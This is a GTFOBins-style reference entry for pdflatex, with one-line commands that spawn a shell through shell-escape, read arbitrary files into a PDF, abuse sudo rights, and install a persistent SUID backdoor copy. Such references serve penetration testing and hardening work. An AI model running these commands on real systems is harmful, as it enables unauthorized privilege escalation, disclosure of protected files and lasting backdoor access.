# GTFOBin: pdflatex

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

```
pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
```

## File read

It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

The read file will be part of the output.

```
pdflatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}'
pdftotext article.pdf -
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

The read file will be part of the output.

```
sudo pdflatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}'
pdftotext article.pdf -
```

```
sudo pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
```

## Limited SUID

If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

```
sudo install -m =xs $(which pdflatex) .

./pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
```